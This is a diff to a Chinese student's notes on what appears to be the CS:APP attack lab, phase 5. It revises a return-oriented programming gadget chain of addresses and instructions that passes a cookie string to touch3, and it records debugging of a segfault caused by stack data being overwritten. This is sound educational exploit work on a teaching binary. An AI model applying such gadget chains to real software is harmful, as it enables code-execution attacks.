@@ -84,7 +84,8 @@ cookie
 401a34 movl %edx %ecx
 401a13 movl %ecx %esi
 4019d6 add_xy
-4019a2 touch3
+4019a2 movq %rax %rdi
+touch3
 ```
 其中 nop 的加入是为了让 cookie 字串以 0 为结束。
 但是这个方法会seg fault。。。之后再分析
@@ -93,14 +94,14 @@ cookie
 ```
 401a06 movq %rsp %rax
 4019a2 movq %rax %rdi
-401a00 nop (start with 00)
 4019ab pop %rax
 0x48
 401a42 movl %eax %edx
 401a34 movl %edx %ecx
 401a13 movl %ecx %esi
 4019d6 add_xy
-4019a2 touch3
+4019a2 movq %rax %rdi
+touch3
 cookie 
 00
 ```
@@ -109,3 +110,4 @@ cookie
 1. 可能是因为输入太长了，覆盖了什么东西？
     - 把标准答案后再添了点东西，发现并不会造成 seg fault 不是这个原因。
 2. 猜测是栈顶释放掉空间属于是别人的了，所以要把未来要用的数据藏在栈底。
+    - 确实被别的函数改动了。。。还是要把数据藏好，好奇为什么第二题放在栈顶也不会出问题。是和随机栈位置有关吗？
